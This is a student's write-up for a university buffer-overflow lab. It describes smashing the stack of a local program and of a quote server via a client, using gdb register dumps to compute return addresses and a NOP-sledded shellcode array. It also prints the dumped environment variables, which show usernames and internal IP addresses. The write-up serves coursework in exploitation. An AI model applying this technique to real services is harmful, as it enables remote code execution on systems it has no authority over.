Team Members:
Jose Ramon Gonzalez
Group: 3
Lab 5

* Files and executables were generated with make
* Found the environ var to be 0x7ffff7fbe600 for both

SELFCOMP:
- COMPROMISE1
Added x's to comprise1 until we got a seg fault at 160 chars. This gave us the following core dump which we look at with gdb,

Core was generated by `./selfcomp'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x0000555555555203 in ?? ()
(gdb) info registers 
rax            0x0                 0
rbx            0x555555555210      93824992236048
rcx            0x5555555592a0      93824992252576
rdx            0x555555556030      93824992239664
rsi            0x0                 0
rdi            0x555555559330      93824992252720
rbp            0x5a595857504f4e4d  0x5a595857504f4e4d
rsp            0x7fffffffe3e8      0x7fffffffe3e8
r8             0x0                 0
r9             0x7ffff7dd3070      140737351856240
r10            0x7ffff7fbbbe0      140737353858016
r11            0x5555555592a0      93824992252576
r12            0x555555555080      93824992235648
r13            0x7fffffffe4f0      140737488348400
r14            0x0                 0
r15            0x0                 0
rip            0x555555555203      0x555555555203
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

this indicates that our method was correct since rbp is 0x5a595857504f4e4d. From here we can get the stack pointer (rsp) and we can get the return address to be 
0x7fffffffe3e8 - 152(0x98) = 0x7fffffffe350, where 0x98 is the number of chars from the start of compromise1 to the 'Z' char.

Note that the rbp value is little endian for 'MNOPWXYZ'.

- COMPROMISE:	
An exploit was written in the exploit.nasm file and then the result from the exploit.lst file clean to only be the hex and placed in the compromise array with NOPs. The array had to 
have a size of 160 so the NOPs were added to fill what was missing. In the compromise array the return address found in COMPROMISE1 was used. Running the file gave me the following,

SHELL=/bin/bash
PWD=/home/19jrg4/elec377-thurs-3/lab5
KRB5CCNAME=FILE:/tmp/krb5cc_1007_0XkAon
LOGNAME=19jrg4
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/19jrg4
LANG=C.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=>
SSH_CONNECTION=10.216.187.43 47686 192.168.122.107 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=19jrg4
SHLVL=1
XDG_SESSION_ID=2325
XDG_RUNTIME_DIR=/run/user/1007
SSH_CLIENT=10.216.187.43 47686 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1007/bus
SSH_TTY=/dev/pts/0
_=./selfcomp
OLDPWD=/home/19jrg4
MD5=8b7588b30498654be2626aac62ef37a3

CLIENT:
- COMPROMISE1:
Opened two seperate terminals one for quoteserv and the other for client where the test port was 10000.
Added x's to the comprise1 array until we got a return code 139 from the server at 226 chars where rbp was 0x5a595857504f4e4d indicating we had successfully overflowed the buffer.
./quoteserv 10000
 Return code: 139

./client 10000
Port Number  10000

Core was generated by `./quoteserv 10000'.
Program terminated with signal SIGSEGV, Segmentation fault.
#0  0x000055555555696a in ?? ()
(gdb) info registers 
rax            0x7fffffffe2d0      140737488347856
rbx            0x555555556bd0      93824992242640
rcx            0x0                 0
rdx            0x7fffffffe39d      140737488348061
rsi            0x7fffffffe2b0      140737488347824
rdi            0x7fffffffe2d0      140737488347856
rbp            0x5a595857504f4e4d  0x5a595857504f4e4d
rsp            0x7fffffffe2b8      0x7fffffffe2b8
r8             0xfefefefefefefeff  -72340172838076673
r9             0xfefeffe077777777  -72339204449273993
r10            0x7ffff7fc2810      140737353885712
r11            0x7fffffffe2b1      140737488347825
r12            0x555555556460      93824992240736
r13            0x7fffffffe4d0      140737488348368
r14            0x0                 0
r15            0x0                 0
rip            0x55555555696a      0x55555555696a
eflags         0x10246             [ PF ZF IF RF ]
cs             0x33                51
ss             0x2b                43
ds             0x0                 0
es             0x0                 0
fs             0x0                 0
gs             0x0                 0

using the above we found rsp and then took the size of comprise to be 224 (226-2 for the \n), which gave us the return address to be 0x7fffffffe2b8 - 216(0xD8) = 0x7fffffffe1e0
here 0xD8 is the number of chars from the start of compromise1 to the 'Z' char. 

- COMPROMISE:
Copy the same exploit from selfcomp into comprise but change the number of NOPs and we now have 0x0A and 0x00 at the end of comprise to exit. The return address we use is the one found
above in COMPRISE1. Running the code gave us the following env vars.

/quoteserv 10000
 Return code: 0

./client 10000
Port Number  10000
SHELL=/bin/bash
PWD=/home/19jrg4/elec377-thurs-3/lab5
KRB5CCNAME=FILE:/tmp/krb5cc_1007_yY7OPv
LOGNAME=19jrg4
XDG_SESSION_TYPE=tty
MOTD_SHOWN=pam
HOME=/home/19jrg4
LANG=C.UTF-8
LS_COLORS=rs=0:di=01;34:ln=01;36:mh=00:pi=40;33:so=01;35:do=01;35:bd=40;33;01:cd=40;33;01:or=40;31;01:mi=00:su=37;41:sg=30;43:ca=30;41:tw=30;42:ow=34;42:st=37;44:ex=01;32:*.tar=01;31:*.tgz=>
SSH_CONNECTION=10.216.187.43 49944 192.168.122.107 22
LESSCLOSE=/usr/bin/lesspipe %s %s
XDG_SESSION_CLASS=user
TERM=xterm-256color
LESSOPEN=| /usr/bin/lesspipe %s
USER=19jrg4
SHLVL=1
XDG_SESSION_ID=2336
XDG_RUNTIME_DIR=/run/user/1007
SSH_CLIENT=10.216.187.43 49944 22
XDG_DATA_DIRS=/usr/local/share:/usr/share:/var/lib/snapd/desktop
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/games:/snap/bin
DBUS_SESSION_BUS_ADDRESS=unix:path=/run/user/1007/bus
SSH_TTY=/dev/pts/1
OLDPWD=/home/19jrg4
_=./quoteserv
MD5=fef0c59c12d958bdd58d4ed367544d29
